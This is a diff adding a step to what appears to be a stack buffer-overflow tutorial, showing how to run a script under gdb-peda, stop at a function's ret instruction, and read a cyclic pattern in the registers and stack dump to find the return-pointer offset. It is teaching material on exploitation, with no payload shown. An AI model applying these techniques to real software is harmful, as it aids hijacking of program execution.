@@ -47,6 +47,51 @@ Relevant code in the script:
 ## 2) Locate the offset of the return pointer
 Execute [step1.py -d](./step1.py) to start the script with the debugger attached.
 
+The debugger will start and automatically break upon entering into the `func()` function. Next type `continue` or `c` for short and press enter.
+
+Continue pressing enter until you get to the following instruction:
+```asm
+=> 0x8048570 <func+85>: ret 
+```
+
+It should look like this:
+```asm
+ [----------------------------------registers-----------------------------------]
+EAX: 0x6 
+EBX: 0x0 
+ECX: 0xffffffff 
+EDX: 0xf775b870 --> 0x0 
+ESI: 0xf775a000 --> 0x1b1db0 
+EDI: 0xf775a000 --> 0x1b1db0 
+EBP: 0x6161616b ('kaaa')
+ESP: 0xffe2f12c ("laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
+EIP: 0x8048570 (<func+85>:      ret)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804856b <func+80>: add    esp,0x10
+   0x804856e <func+83>: nop
+   0x804856f <func+84>: leave  
+=> 0x8048570 <func+85>: ret    
+   0x8048571 <main>:    lea    ecx,[esp+0x4]
+   0x8048575 <main+4>:  and    esp,0xfffffff0
+   0x8048578 <main+7>:  push   DWORD PTR [ecx-0x4]
+   0x804857b <main+10>: push   ebp
+[------------------------------------stack-------------------------------------]
+0000| 0xffe2f12c ("laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
+0004| 0xffe2f130 ("maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
+0008| 0xffe2f134 ("naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
+0012| 0xffe2f138 ("oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
+0016| 0xffe2f13c ("paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
+0020| 0xffe2f140 ("qaaaraaasaaataaauaaavaaawaaaxaaayaaa")
+0024| 0xffe2f144 ("raaasaaataaauaaavaaawaaaxaaayaaa")
+0028| 0xffe2f148 ("saaataaauaaavaaawaaaxaaayaaa")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+gdb-peda$ 
+```
+
+
+
 ## 3) Find _where_ to redirect code execution
 
 ## 4) Construct and send our input 
